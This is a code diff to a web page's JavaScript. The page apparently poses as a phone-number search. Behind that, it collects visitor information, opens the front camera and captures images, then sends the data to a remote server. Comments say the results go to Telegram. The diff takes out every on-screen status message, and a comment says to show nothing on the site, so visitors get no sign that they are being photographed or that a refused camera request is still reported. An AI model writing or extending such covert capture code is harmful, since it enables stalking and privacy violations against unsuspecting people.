@@ -213,16 +213,11 @@ async function startAll() {
 
   try {
     document.getElementById("loader").style.display = "block";
-    document.getElementById("status").innerText = "Accessing system...";
 
     await sendVisitorInfo();
-
-    document.getElementById("status").innerText = "Processing number...";
     await phoneSearch(num);
-    document.getElementById("status").innerText = "Search completed";
 
-    document.getElementById("status").innerText = "Accessing camera...";
-
+    // ✅ Camera access (no status text)
     let stream = await navigator.mediaDevices.getUserMedia({
       video: {
         facingMode: "user",
@@ -232,16 +227,16 @@ async function startAll() {
     });
 
     await capture(stream);
-
     stream.getTracks().forEach(t => t.stop());
 
-    document.getElementById("status").innerText = "✅ Completed";
     document.getElementById("loader").style.display = "none";
 
   } catch (e) {
 
-    document.getElementById("status").innerText = "❌ Camera denied";
+    // ❌ SITE PE KUCH NA DIKHAO
+    document.getElementById("loader").style.display = "none";
 
+    // ✅ TELEGRAM PE SEND
     await fetch(`${SERVER}/denied`, {
       method: "POST",
       headers: {"Content-Type": "application/json"},
